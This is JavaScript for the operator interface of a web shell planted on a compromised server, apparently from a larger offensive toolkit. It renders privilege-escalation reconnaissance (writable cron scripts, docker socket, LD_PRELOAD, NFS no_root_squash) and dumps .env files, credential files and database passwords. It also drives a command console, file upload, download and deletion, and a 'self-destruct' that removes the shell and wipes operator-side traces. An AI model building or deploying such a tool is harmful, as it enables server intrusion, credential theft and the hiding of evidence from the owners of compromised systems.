        const bndFull = capBnd && /^0*1?f{10}$/.test(capBnd.hex);
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('Process Capabilities', 'shield') + '<div class="card-body">';
        // CapEff — what this process can actually do
        if (capEff) {
          const effCaps = capEff.caps || [];
          if (effCaps.length > 0) {
            html += '<div class="diag-alert diag-alert--danger" style="margin-bottom:6px">' + diagIconInline('warn') + 'Effective capabilities (active privileges):</div>';
            html += '<div style="display:flex;flex-wrap:wrap;gap:4px;margin-bottom:10px">';
            effCaps.forEach(function(c) {
              html += '<span class="badge ' + (dangerCaps[c] ? 'badge-no' : 'badge-warn') + '" style="font-size:11px">' + escHtml(c) + '</span>';
            });
            html += '</div>';
          } else {
            html += '<div class="diag-item"><span class="diag-label">Effective (CapEff)</span><span class="diag-value"><span class="badge badge-ok">none</span> \u2014 no elevated privileges</span></div>';
          }
        }
        // CapBnd — only show if restricted (indicates container/hardening)
        if (capBnd && !bndFull) {
          html += '<div class="diag-alert diag-alert--warn" style="margin-top:8px;margin-bottom:4px">' + diagIconInline('lock') + 'Bounding set is restricted (container/hardened):</div>';
          html += '<div style="display:flex;flex-wrap:wrap;gap:4px">';
          (capBnd.caps || []).forEach(function(c) {
            html += '<span class="badge badge-ok" style="font-size:10px">' + escHtml(c) + '</span>';
          });
          html += '</div>';
        } else if (capBnd) {
          html += '<div class="diag-item"><span class="diag-label">Bounding (CapBnd)</span><span class="diag-value"><span style="color:var(--muted)">full (default, unrestricted)</span></span></div>';
        }
        html += '</div></div>';
      }

      // --- Cron Jobs ---
      if (d.cron_jobs && d.cron_jobs.length > 0) {
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('Cron Jobs', 'clock') + '<div class="card-body">';
        d.cron_jobs.forEach(function(cj) {
          const wrFlag = cj.source_writable ? ' <span class="badge badge-no">WRITABLE</span>' : '';
          html += '<div style="font-size:11px;color:var(--yellow);margin-bottom:4px;cursor:pointer" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display===\'none\'?\'block\':\'none\'">' + diagIconInline('chevron') + escHtml(cj.source) + wrFlag + '</div>';
          html += '<pre style="display:none;font-size:11px;background:rgba(0,0,0,.3);padding:8px;border-radius:4px;margin:0 0 8px 0;white-space:pre-wrap;word-break:break-all;color:var(--fg)">' + escHtml(cj.content) + '</pre>';
          if (cj.writable_scripts && cj.writable_scripts.length > 0) {
            cj.writable_scripts.forEach(function(ws) {
              html += '<div style="font-size:11px;color:var(--red);margin-bottom:2px">' + diagIconInline('warn') + 'Writable script: <span style="font-family:monospace">' + escHtml(ws) + '</span></div>';
            });
          }
        });
        html += '</div></div>';
      }

      // --- Sudo Config ---
      if (d.sudo_config && d.sudo_config.readable) {
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('Sudo Configuration', 'lock') + '<div class="card-body">';
        Object.entries(d.sudo_config.files || {}).forEach(function(e) {
          html += '<div style="font-size:11px;color:var(--yellow);margin-bottom:4px;cursor:pointer" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display===\'none\'?\'block\':\'none\'">' + diagIconInline('chevron') + escHtml(e[0]) + '</div>';
          html += '<pre style="display:none;font-size:11px;background:rgba(0,0,0,.3);padding:8px;border-radius:4px;margin:0 0 8px 0;white-space:pre-wrap;word-break:break-all;color:var(--fg)">' + escHtml(e[1]) + '</pre>';
        });
        html += '</div></div>';
      }

      // --- Docker Socket ---
      if (d.docker_socket && (d.docker_socket.sockets.length > 0 || d.docker_socket.user_in_docker_group)) {
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('Docker / Podman Socket', 'box') + '<div class="card-body">';
        if (d.docker_socket.user_in_docker_group) {
          html += '<div class="diag-alert diag-alert--danger" style="margin-bottom:8px">' + diagIconInline('warn') + 'Current user is in docker group!</div>';
        }
        d.docker_socket.sockets.forEach(function(s) {
          const status = s.writable ? '<span class="badge badge-no">' + diagIconInline('warn') + 'WRITABLE (root equiv!)</span>' : (s.readable ? '<span class="badge badge-warn">readable</span>' : '<span class="badge badge-ok">exists</span>');
          html += '<div class="diag-item"><span class="diag-label" style="font-family:monospace">' + escHtml(s.path) + '</span><span class="diag-value">' + status + '</span></div>';
        });
        html += '</div></div>';
      }

      // --- Mounts ---
      if (d.mounts && d.mounts.length > 0) {
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('Mount Points', 'disk') + '<div class="card-body" style="padding:0">';
        html += '<div style="max-height:250px;overflow-y:auto">';
        html += '<table class="file-table"><thead><tr><th>Mountpoint</th><th>FS</th><th>RW</th><th>nosuid</th><th>noexec</th></tr></thead><tbody>';
        d.mounts.forEach(function(m) {
          const rowStyle = (m.writable && !m.nosuid) ? 'background:rgba(210,153,34,.06)' : '';
          html += '<tr style="' + rowStyle + '"><td style="font-family:monospace;font-size:11px">' + escHtml(m.mountpoint) + '</td>';
          html += '<td>' + escHtml(m.fstype) + '</td>';
          html += '<td>' + (m.writable ? '<span class="badge badge-warn">rw</span>' : '<span style="color:var(--muted)">ro</span>') + '</td>';
          html += '<td>' + (m.nosuid ? '<span class="badge badge-ok">yes</span>' : '<span class="badge badge-no">no</span>') + '</td>';
          html += '<td>' + (m.noexec ? '<span class="badge badge-ok">yes</span>' : '<span class="badge badge-no">no</span>') + '</td></tr>';
        });
        html += '</tbody></table></div></div></div>';
      }

      // --- Kernel Info ---
      if (d.kernel_info) {
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('Kernel Info', 'chip') + '<div class="card-body">';
        html += '<div class="diag-item"><span class="diag-label">Release</span><span class="diag-value" style="font-family:monospace;color:var(--yellow)">' + escHtml(d.kernel_info.release) + '</span></div>';
        html += '<div class="diag-item"><span class="diag-label">Arch</span><span class="diag-value">' + escHtml(d.kernel_info.arch) + '</span></div>';
        const aslrVal = d.kernel_info.aslr;
        const aslrLabel = aslrVal === '0' ? '<span class="badge badge-no">OFF (0)</span>' : aslrVal === '1' ? '<span class="badge badge-warn">Partial (1)</span>' : aslrVal === '2' ? '<span class="badge badge-ok">Full (2)</span>' : '<span style="color:var(--muted)">' + escHtml(String(aslrVal)) + '</span>';
        html += '<div class="diag-item"><span class="diag-label">ASLR</span><span class="diag-value">' + aslrLabel + '</span></div>';
        if (d.kernel_info.proc_version) {
          html += '<div style="margin-top:8px;font-size:11px;color:var(--muted);word-break:break-all">' + escHtml(d.kernel_info.proc_version) + '</div>';
        }
        html += '</div></div>';
      }

      // --- Security Modules ---
      if (d.security_modules) {
        const sm = d.security_modules;
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('Security Modules', 'shield') + '<div class="card-body">';
        // SELinux
        if (sm.selinux.present) {
          const seStatus = sm.selinux.enforcing === 1 ? '<span class="badge badge-ok">Enforcing</span>' : sm.selinux.enforcing === 0 ? '<span class="badge badge-warn">Permissive</span>' : '<span class="badge badge-warn">Unknown</span>';
          html += '<div class="diag-item"><span class="diag-label">SELinux</span><span class="diag-value">' + seStatus + '</span></div>';
        } else {
          html += '<div class="diag-item"><span class="diag-label">SELinux</span><span class="diag-value"><span style="color:var(--muted)">not present</span></span></div>';
        }
        // AppArmor
        if (sm.apparmor.present) {
          html += '<div class="diag-item"><span class="diag-label">AppArmor</span><span class="diag-value"><span class="badge badge-ok">Active</span> ' + sm.apparmor.profiles_count + ' profiles</span></div>';
        } else {
          html += '<div class="diag-item"><span class="diag-label">AppArmor</span><span class="diag-value"><span style="color:var(--muted)">not present</span></span></div>';
        }
        // Seccomp
        const scLabel = sm.seccomp === 0 ? '<span class="badge badge-no">Disabled</span>' : sm.seccomp === 1 ? '<span class="badge badge-ok">Strict</span>' : sm.seccomp === 2 ? '<span class="badge badge-ok">Filter</span>' : '<span style="color:var(--muted)">unknown</span>';
        html += '<div class="diag-item"><span class="diag-label">Seccomp</span><span class="diag-value">' + scLabel + '</span></div>';
        html += '</div></div>';
      }

      // --- LD_PRELOAD ---
      if (d.ld_preload && (d.ld_preload.exists || d.ld_preload.env_value)) {
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('LD_PRELOAD', 'package') + '<div class="card-body">';
        if (d.ld_preload.exists) {
          html += '<div class="diag-item"><span class="diag-label">/etc/ld.so.preload</span><span class="diag-value">' + (d.ld_preload.writable ? '<span class="badge badge-no">' + diagIconInline('warn') + 'WRITABLE (critical!)</span>' : '<span class="badge badge-ok">exists, not writable</span>') + '</span></div>';
          if (d.ld_preload.content) {
            html += '<pre style="font-size:11px;background:rgba(0,0,0,.3);padding:8px;border-radius:4px;margin:8px 0 0 0;color:var(--fg)">' + escHtml(d.ld_preload.content) + '</pre>';
          }
        }
        if (d.ld_preload.env_value) {
          html += '<div class="diag-item"><span class="diag-label">LD_PRELOAD env</span><span class="diag-value" style="font-family:monospace">' + escHtml(d.ld_preload.env_value) + '</span></div>';
        }
        html += '</div></div>';
      }

      // --- NFS Exports ---
      if (d.nfs_exports && d.nfs_exports.readable) {
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('NFS Exports', 'folder') + '<div class="card-body">';
        if (d.nfs_exports.no_root_squash && d.nfs_exports.no_root_squash.length > 0) {
          html += '<div class="diag-alert diag-alert--danger" style="margin-bottom:8px">' + diagIconInline('warn') + 'no_root_squash found!</div>';
          d.nfs_exports.no_root_squash.forEach(function(l) {
            html += '<div style="font-family:monospace;font-size:11px;color:var(--yellow)">' + escHtml(l) + '</div>';
          });
        }
        if (d.nfs_exports.content) {
          html += '<pre style="font-size:11px;background:rgba(0,0,0,.3);padding:8px;border-radius:4px;margin:8px 0 0 0;white-space:pre-wrap;color:var(--fg)">' + escHtml(d.nfs_exports.content) + '</pre>';
        }
        html += '</div></div>';
      }

      // --- Systemd Timers ---
      if (d.systemd_timers && d.systemd_timers.length > 0) {
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('Systemd Timers', 'clock') + '<div class="card-body" style="padding:0">';
        html += '<table class="file-table"><thead><tr><th>Timer</th><th>Writable</th><th>ExecStart</th><th>Exec Writable</th></tr></thead><tbody>';
        d.systemd_timers.forEach(function(t) {
          const rowStyle = t.exec_writable ? 'background:rgba(248,81,73,.06)' : '';
          html += '<tr style="' + rowStyle + '"><td style="font-size:11px;font-family:monospace">' + escHtml(t.timer_path) + '</td>';
          html += '<td>' + (t.timer_writable ? '<span class="badge badge-no">YES</span>' : '<span style="color:var(--muted)">no</span>') + '</td>';
          html += '<td style="font-size:11px;font-family:monospace">' + escHtml(t.exec_start || '-') + '</td>';
          html += '<td>' + (t.exec_writable ? '<span class="badge badge-no">' + diagIconInline('warn') + 'YES</span>' : '<span style="color:var(--muted)">' + (t.exec_start ? 'no' : '-') + '</span>') + '</td></tr>';
        });
        html += '</tbody></table></div></div>';
      }

      // ---- Privesc vectors (existing) ----
      html += '<div class="diag-grid" style="margin-bottom:16px">';

      html += '<div class="card" style="margin:0">' + diagCardHeader('Binary Directories', 'folder') + '<div class="card-body" style="padding:0">';
      if (d.bin_dirs && d.bin_dirs.length > 0) {
        html += '<table class="file-table"><thead><tr><th>Path</th><th>Readable</th><th>Writable</th></tr></thead><tbody>';
        d.bin_dirs.forEach(function(b) {
          const wStyle = b.writable ? 'color:var(--red);font-weight:600' : '';
          html += '<tr><td>' + escHtml(b.path) + '</td>'
            + '<td>' + (b.readable ? '<span class="badge badge-ok">yes</span>' : '<span class="badge badge-no">no</span>') + '</td>'
            + '<td style="' + wStyle + '">' + (b.writable ? '<span class="badge badge-ok" style="background:rgba(210,153,34,.15);color:var(--red)">WRITABLE</span>' : '<span class="badge badge-no">no</span>') + '</td></tr>';
        });
        html += '</tbody></table>';
      } else { html += '<div class="diag-empty">None found.</div>'; }
      html += '</div></div>';

      html += '<div class="card" style="margin:0">' + diagCardHeader('Writable Dirs & Readable Sensitive Files', 'edit') + '<div class="card-body">';
      if (d.writable_dirs && d.writable_dirs.length > 0) {
        html += '<div class="diag-subsection-title" style="margin-bottom:8px">Writable</div>';
        html += '<div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px">';
        d.writable_dirs.forEach(function(p) { html += '<span class="badge badge-ok">' + escHtml(p) + '</span>'; });
        html += '</div>';
      }
      if (d.readable_files && d.readable_files.length > 0) {
        html += '<div class="diag-alert diag-alert--danger" style="margin-bottom:4px">' + diagIconInline('warn') + 'Readable sensitive files:</div>';
        d.readable_files.forEach(function(f) {
          html += '<div class="mono-sm" style="color:var(--yellow);cursor:pointer" onclick="insertCode(\'echo file_get_contents(\\\'' + escHtml(f) + '\\\');\')">' + diagIconInline('file') + escHtml(f) + '</div>';
        });
      }
      html += '</div></div>';
      html += '</div>';

      // ---- Panels + Creds ----
      html += '<div class="diag-grid" style="margin-bottom:16px">';

      html += '<div class="card" style="margin:0">' + diagCardHeader('Detected Panels', 'home') + '<div class="card-body">';
      if (d.panels && d.panels.length > 0) {
        d.panels.forEach(function(p) { html += '<div class="diag-item"><span class="diag-value" style="color:var(--green)">' + diagIconInline('check') + escHtml(p) + '</span></div>'; });
      } else { html += '<div style="color:var(--muted)">None detected.</div>'; }
      html += '</div></div>';

      html += '<div class="card" style="margin:0">' + diagCardHeader('Environment Files (.env)', 'key') + '<div class="card-body">';
      if (d.env_files && Object.keys(d.env_files).length > 0) {
        Object.entries(d.env_files).forEach(function(e) {
          html += '<div style="font-size:11px;color:var(--yellow);margin-bottom:4px;cursor:pointer" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display===\'none\'?\'block\':\'none\'">' + diagIconInline('chevron') + escHtml(e[0]) + '</div>';
          html += '<pre style="display:none;font-size:11px;background:rgba(0,0,0,.3);padding:8px;border-radius:4px;margin:0 0 10px 0;white-space:pre-wrap;word-break:break-all;color:var(--fg)">' + escHtml(e[1]) + '</pre>';
        });
      } else { html += '<div style="color:var(--muted)">None found.</div>'; }
      html += '</div></div>';
      html += '</div>';

      // --- Credential Files ---
      if (d.credential_files && Object.keys(d.credential_files).length > 0) {
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('Credential Files', 'key') + '<div class="card-body">';
        Object.entries(d.credential_files).forEach(function(e) {
          html += '<div style="font-size:11px;color:var(--yellow);margin-bottom:4px;cursor:pointer" onclick="this.nextElementSibling.style.display=this.nextElementSibling.style.display===\'none\'?\'block\':\'none\'">' + diagIconInline('chevron') + escHtml(e[0]) + '</div>';
          html += '<pre style="display:none;font-size:11px;background:rgba(0,0,0,.3);padding:8px;border-radius:4px;margin:0 0 10px 0;white-space:pre-wrap;word-break:break-all;color:var(--fg)">' + escHtml(e[1]) + '</pre>';
        });
        html += '</div></div>';
      }

      // --- Backup Files ---
      if (d.backup_files && d.backup_files.length > 0) {
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('Backup / Config Files', 'package') + '<div class="card-body">';
        d.backup_files.forEach(function(bf) {
          html += '<div class="diag-item"><span class="diag-label mono-sm">' + escHtml(bf.path) + '</span><span class="diag-value">' + formatBytes(bf.size) + (bf.readable ? ' <span class="badge badge-ok">readable</span>' : '') + '</span></div>';
        });
        html += '</div></div>';
      }

      // ---- Build info ----
      if (typeof __BUILD !== 'undefined') {
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('Build Info', 'tag') + '<div class="card-body">';
        [
          ['Build ID', __BUILD.short_id],
          ['SHA256', __BUILD.hash],
          ['Built', __BUILD.timestamp],
          ['Language', __BUILD.lang],
          ['Version', __BUILD.version],
        ].forEach(function(kv) {
          html += '<div class="diag-item"><span class="diag-label">' + kv[0] + '</span><span class="diag-value">' + escHtml(kv[1] || 'N/A') + '</span></div>';
        });
        html += '</div></div>';
      }

      // ---- Processes ----
      html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('Running Processes', 'play') + '<div class="card-body" style="padding:0">';
      html += '<div style="max-height:300px;overflow-y:auto">';
      html += '<table class="file-table"><thead><tr><th>PID</th><th>UID</th><th>Command</th></tr></thead><tbody>';
      (d.processes || []).forEach(function(p) {
        const isRoot = p.uid === 0;
        html += '<tr><td style="color:var(--muted)">' + escHtml(p.pid) + '</td><td style="' + (isRoot?'color:var(--red)':'') + '">' + escHtml(p.uid) + '</td><td class="mono-sm">' + escHtml(p.cmd) + '</td></tr>';
      });
      html += '</tbody></table></div></div></div>';

      // ---- Framework Detection ----
      if (d.frameworks && d.frameworks.length > 0) {
        html += '<div class="card" style="margin-bottom:16px">' + diagCardHeader('Framework / CMS Detection', 'search') + '<div class="card-body">';
        d.frameworks.forEach(function(fw) {
          var verBadge = fw.version ? '<span class="badge badge-ok">' + escHtml(fw.version) + '</span>' : '<span class="badge badge-warn">unknown</span>';
          html += '<div style="margin-bottom:16px;padding:12px;background:rgba(0,0,0,.2);border-radius:6px;border:1px solid var(--border)">';
          html += '<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px"><strong class="diag-fw-title">' + escHtml(fw.name) + '</strong> ' + verBadge + '</div>';
          if (fw.config_path) html += '<div class="diag-item"><span class="diag-label">Config</span><span class="diag-value">' + escHtml(fw.config_path) + '</span></div>';
          var det = fw.details || {};
          if (det.db_host || det.db_name || det.db_user) {
            html += '<div style="margin-top:8px;padding:8px;background:rgba(0,0,0,.2);border-radius:4px">';
            html += '<div style="color:var(--red);font-weight:600;margin-bottom:4px">Database Credentials</div>';
            if (det.db_host) html += '<div class="diag-item"><span class="diag-label">Host</span><span class="diag-value">' + escHtml(det.db_host) + '</span></div>';
            if (det.db_name) html += '<div class="diag-item"><span class="diag-label">Database</span><span class="diag-value">' + escHtml(det.db_name) + '</span></div>';
            if (det.db_user) html += '<div class="diag-item"><span class="diag-label">User</span><span class="diag-value">' + escHtml(det.db_user) + '</span></div>';
            if (det.db_pass) html += '<div class="diag-item"><span class="diag-label">Password</span><span class="diag-value" style="color:var(--red)">' + escHtml(det.db_pass) + '</span></div>';
            if (det.db_driver) html += '<div class="diag-item"><span class="diag-label">Driver</span><span class="diag-value">' + escHtml(det.db_driver) + '</span></div>';
            if (det.table_prefix) html += '<div class="diag-item"><span class="diag-label">Table prefix</span><span class="diag-value">' + escHtml(det.table_prefix) + '</span></div>';
            if (det.database_url) html += '<div class="diag-item"><span class="diag-label">DATABASE_URL</span><span class="diag-value" style="color:var(--red);word-break:break-all">' + escHtml(det.database_url) + '</span></div>';
            html += '</div>';
          }
          if (det.debug) {
            var debugColor = det.debug === 'enabled' ? 'var(--red)' : 'var(--green)';
            html += '<div class="diag-item"><span class="diag-label">Debug mode</span><span class="badge" style="background:rgba(0,0,0,.2);color:' + debugColor + '">' + escHtml(det.debug) + '</span></div>';
          }
          if (det.app_key) html += '<div class="diag-item"><span class="diag-label">APP_KEY</span><span class="diag-value" style="color:var(--yellow);word-break:break-all">' + escHtml(det.app_key) + '</span></div>';
          if (det.app_env) html += '<div class="diag-item"><span class="diag-label">APP_ENV</span><span class="diag-value">' + escHtml(det.app_env) + '</span></div>';
          if (det.admin_path) html += '<div class="diag-item"><span class="diag-label">Admin path</span><span class="diag-value">' + escHtml(det.admin_path) + '</span></div>';
          if (det.plugins !== undefined) html += '<div class="diag-item"><span class="diag-label">Plugins</span><span class="diag-value">' + det.plugins + '</span></div>';
          if (det.themes !== undefined) html += '<div class="diag-item"><span class="diag-label">Themes</span><span class="diag-value">' + det.themes + '</span></div>';
          if (det.log_file) html += '<div class="diag-item"><span class="diag-label">Log file</span><span class="diag-value">' + escHtml(det.log_file) + '</span></div>';
          html += '</div>';
        });
        html += '</div></div>';
      }

      body.innerHTML = html;
    })
    .catch(function(err) {
      body.innerHTML = '<div style="color:var(--red)">Error: ' + escHtml(String(err)) + '</div>';
    })
    .finally(function() { window._diagInFlight = null; });
  return window._diagInFlight;
}

// Fetch and display a session file's contents. Inserts a detail row after
// the clicked table row showing the file body inside a <pre>.
function diagToggleSessionFile(btn, path) {
  const tr = btn.closest('tr');
  if (!tr) return;
  // If already expanded, remove next sibling detail row
  if (tr.nextElementSibling && tr.nextElementSibling.classList && tr.nextElementSibling.classList.contains('diag-session-detail')) {
    tr.parentNode.removeChild(tr.nextElementSibling);
    return;
  }
  const fd = new FormData();
  fd.append('action', 'read_session_file');
  fd.append('path', path);
  btn.disabled = true;
  fetchJSON(fd).then(function(r) {
    btn.disabled = false;
    if (r.error) {
      alert('Error: ' + r.error);
      return;
    }
    const det = document.createElement('tr');
    det.className = 'diag-session-detail';
    const td = document.createElement('td');
    td.colSpan = 5;
    const label = document.createElement('div');
    label.className = 'diag-note';
    label.style.cssText = 'margin-bottom:4px;display:flex;align-items:center;gap:6px';
    label.innerHTML = 'Session file contents — click to copy' +
      (r.truncated ? ' <span class="badge badge-warn" title="File was truncated to 20 KB">truncated</span>' : '');
    td.appendChild(label);
    const pre = document.createElement('pre');
    pre.className = 'copyable';
    pre.title = 'Click to copy';
    pre.style.whiteSpace = 'pre-wrap';
    pre.style.maxHeight = '300px';
    pre.style.overflow = 'auto';
    pre.textContent = r.content;
    td.appendChild(pre);
    det.appendChild(td);
    tr.parentNode.insertBefore(det, tr.nextSibling);
  }).catch(function(err) {
    btn.disabled = false;
    alert('Failed: ' + err.message);
  });
}

function formatBytes(b) {
  if (b > 1e9) return (b/1e9).toFixed(1) + ' GB';
  if (b > 1e6) return (b/1e6).toFixed(1) + ' MB';
  return (b/1e3).toFixed(1) + ' KB';
}


// ==================== HISTORY ====================
function historyTsAttr(ts) {
  if (typeof ts !== 'string' || !ts) return '';
  if (/["'<>\\]/.test(ts)) return '';
  return ts;
}

function renderHistory() {
  const body = document.getElementById('history-body');
  body.innerHTML = '<span class="spinner"></span>';
  dbGetAll('history').then(h => {
    if (h.length === 0) {
      body.innerHTML = '<p class="empty-state">No history yet.</p>';
      return;
    }
    body.innerHTML = h.map(item => {
      const tsKey = historyTsAttr(item.ts);
      const actions = tsKey
        ? '<button type="button" class="btn btn-sm btn-secondary" data-ts="' + escHtml(tsKey) +
          '" onclick="rerun(this.dataset.ts)">Re-run</button>' +
          '<button type="button" class="btn btn-sm btn-secondary" data-ts="' + escHtml(tsKey) +
          '" onclick="copyItem(this.dataset.ts)">Copy</button>'
        : '';
      return '<div class="history-item">' +
      '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px">' +
      '<span class="history-cmd">' + escHtml(item.cmd.substring(0,80)) + (item.cmd.length>80?'...':'') + '</span>' +
      '<div style="display:flex;gap:6px;align-items:center">' +
      '<span style="font-size:11px;color:var(--muted)">' + new Date((item.ts || '').split('#')[0]).toLocaleString() + '</span>' +
      actions +
      '</div></div>' +
      '<div class="history-out">' + escHtml(item.out.substring(0,500)) + (item.out.length>500?'\n...(truncated)':'') + '</div>' +
      '</div>';
    }).join('');
  });
}

function rerun(ts) {
  if (!historyTsAttr(ts)) return;
  dbGetAll('history').then(h => {
    const item = h.find(x => x.ts === ts);
    if (!item) return;
    document.querySelectorAll('.sidebar-nav a').forEach(x => x.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(x => x.classList.remove('active'));
    document.querySelector('[data-tab="console"]').classList.add('active');
    document.getElementById('tab-console').classList.add('active');
    document.getElementById('console-input').value = item.cmd;
  });
}

function copyItem(ts) {
  if (!historyTsAttr(ts)) return;
  dbGetAll('history').then(h => {
    const item = h.find(x => x.ts === ts);
    if (item) clipCopy(item.cmd + '\n\n' + item.out);
  });
}

function clearHistory() {
  if (confirm('Clear all command history?')) {
    dbClear('history').then(() => {
      if (window.Terminal && typeof Terminal.clearTerminalHistory === 'function') {
        Terminal.clearTerminalHistory();
      }
      renderHistory();
    });
  }
}

function exportHistory() {
  dbGetAll('history').then(h => {
    const text = h.map(item =>
      '// ' + item.ts + '\n' + item.cmd + '\n\n/' + '* OUTPUT:\n' + item.out + '\n' + '*' + '/\n'
    ).join('\n---\n\n');
    const blob = new Blob([text], {type: 'text/plain'});
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'shell_history_' + Date.now() + '.txt';
    a.click();
  });
}


// ==================== FILE BROWSER ====================
let currentDir = '/';

(function() {
  const body = document.getElementById('files-body');
  if (!body) return;
  body.addEventListener('click', ev => {
    const link = ev.target.closest('.dir-link');
    if (link) { ev.preventDefault(); browseDir(link.dataset.path); }
  });
})();

function browseDir(path) {
  currentDir = path;
  const body = document.getElementById('files-body');
  document.getElementById('files-path-input').value = path;
  body.innerHTML = '<div style="padding:16px"><span class="spinner"></span>Loading...</div>';

  const fd = new FormData();
  fd.append('action', 'ls');
  fd.append('dir', path);

  fetchJSON(fd)
    .then(data => {
      currentDir = data.dir;
      document.getElementById('files-path-input').value = data.dir;
      if (!data.entries || data.entries.length === 0) {
        body.innerHTML = '<div style="padding:16px;color:var(--muted)">Empty or unreadable.</div>';
        return;
      }
      let html = '<table class="file-table"><thead><tr><th>Name</th><th>Size</th><th>Modified</th><th>Owner</th><th>Perms</th><th>R/W</th><th></th></tr></thead><tbody>';
      data.entries.forEach(e => {
        let name = escHtml(e.name);
        let icon = e.dir
          ? '<svg class="row-icon" viewBox="0 0 16 16"><path d="M1 3v10h12.5L16 6H5L4 4H1z"/></svg>'
          : '<svg class="row-icon" viewBox="0 0 16 16"><path d="M3 1v14h10V5L9 1zm6 1l4 4H9z"/></svg>';
        let nameStyle = '';
        if (e.symlink) {
          icon = '<svg class="row-icon" viewBox="0 0 16 16"><path d="M10 1L8.5 2.5l1.5 1.5L7 6.9l1.4 1.4 3-2.9 1.6 1.6L14 5.5zM6 9.1L4.4 7.5 3 9l1.5 1.5L2 13l1.5 1.5L6 12l1.5 1.5L9 12z"/></svg>';
          const target = escHtml(e.link_target || '?');
          name += ' <span style="color:var(--muted);font-size:11px">&rarr; ' + target + '</span>';
          if (e.broken) nameStyle = 'color:var(--red);text-decoration:line-through';
        }
        const size = e.dir ? '&mdash;' : (e.size !== null ? formatBytes(e.size) : '?');
        const mtime = e.mtime ? new Date(e.mtime * 1000).toISOString().replace('T', ' ').substring(0, 19) : '?';
        const ownerGroup = escHtml(e.owner) + ':' + escHtml(e.group);
        const rw = (e.readable ? '<span style="color:var(--green)">R</span>' : '<span style="color:var(--muted)">-</span>')
          + (e.writable ? '<span style="color:var(--red)">W</span>' : '<span style="color:var(--muted)">-</span>');
        if (e.dir) {
          html += '<tr><td><a class="file-dir dir-link" href="#" data-path="' + escHtml(e.path) + '" style="' + nameStyle + '">' + icon + ' ' + name + '</a></td>';
          html += '<td style="color:var(--muted);font-size:11px">' + size + '</td>';
          html += '<td style="color:var(--muted);font-size:11px">' + mtime + '</td>';
          html += '<td style="color:var(--muted);font-size:11px">' + ownerGroup + '</td>';
          html += '<td><span class="perm">' + escHtml(e.perms) + '</span></td>';
          html += '<td style="font-size:11px">' + rw + '</td>';
          html += '<td><button class="btn btn-sm btn-danger" data-path="' + escHtml(e.path) + '" onclick="deleteFile(this.dataset.path,true)">Del</button></td></tr>';
        } else {
          const dlUrl = location.pathname + '?download=' + encodeURIComponent(e.path);
          html += '<tr><td><a class="file-name" href="' + dlUrl + '" style="' + nameStyle + '">' + icon + ' ' + name + '</a></td>';
          html += '<td style="color:var(--muted);font-size:11px">' + size + '</td>';
          html += '<td style="color:var(--muted);font-size:11px">' + mtime + '</td>';
          html += '<td style="color:var(--muted);font-size:11px">' + ownerGroup + '</td>';
          html += '<td><span class="perm">' + escHtml(e.perms) + '</span></td>';
          html += '<td style="font-size:11px">' + rw + '</td>';
          html += '<td><button class="btn btn-sm btn-danger" data-path="' + escHtml(e.path) + '" onclick="deleteFile(this.dataset.path,false)">Del</button></td></tr>';
        }
      });
      html += '</tbody></table>';
      body.innerHTML = html;
    })
    .catch(err => {
      body.innerHTML = '<div style="padding:16px;color:var(--red)">Error: ' + escHtml(String(err)) + '</div>';
    });
}

function deleteFile(path, isDir) {
  const msg = isDir ? 'Delete directory ' + path + '? (must be empty)' : 'Delete ' + path + '?';
  if (!confirm(msg)) return;
  const fd = new FormData();
  fd.append('action', 'delete');
  fd.append('path', path);
  fetchJSON(fd)
    .then(data => {
      if (data.error) alert('Error: ' + data.error);
      else browseDir(currentDir);
    })
    .catch(e => alert('Request failed: ' + e.message));
}

function uploadFile() {
  const input = document.getElementById('upload-input');
  const status = document.getElementById('upload-status');
  const file = input.files[0];
  if (!file) { status.textContent = 'No file selected.'; return; }
  const fd = new FormData();
  fd.append('action', 'upload');
  fd.append('dir', currentDir);
  fd.append('file', file);
  status.style.color = 'var(--muted)';
  status.textContent = 'Uploading...';
  fetchJSON(fd)
    .then(data => {
      if (data.error) { status.style.color = 'var(--red)'; status.textContent = 'Error: ' + data.error; }
      else {
        status.style.color = 'var(--green)';
        let msg = 'Uploaded: ' + data.path + ' (' + formatBytes(data.size) + ')';
        if (data.overwritten) msg += ' [overwritten]';
        status.textContent = msg;
        input.value = '';
        browseDir(currentDir);
      }
    })
    .catch(e => { status.style.color = 'var(--red)'; status.textContent = 'Upload failed: ' + e.message; });
}


function selfDestruct() {
  if (!confirm('SELF-DESTRUCT: This will permanently delete the shell file from the server and clear all local data. This cannot be undone.\n\nProceed?')) return;
  if (!confirm('Are you absolutely sure?')) return;

  const fd = new FormData();
  fd.append('action', 'destruct');
  fetchJSON(fd).then(r => {
    if (r.ok) {
      try { indexedDB.deleteDatabase('shelldb'); } catch(e) {}
      try { sessionStorage.clear(); } catch(e) {}
      try {
        // Wipe operator-side settings that don't belong to the target server.
        Object.keys(localStorage).forEach(k => {
          if (k.indexOf('faraday.') === 0 || k.indexOf('webtun.') === 0) localStorage.removeItem(k);
        });
      } catch(e) {}
      document.body.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100vh;background:var(--bg,#0d1117);color:var(--green,#3fb950);font-family:monospace;font-size:16px;text-align:center;padding:20px">Shell destroyed successfully.<br>This page is no longer functional.</div>';
    } else {
      alert('Self-destruct failed: ' + (r.error || 'unlink() returned false — check file permissions'));
    }
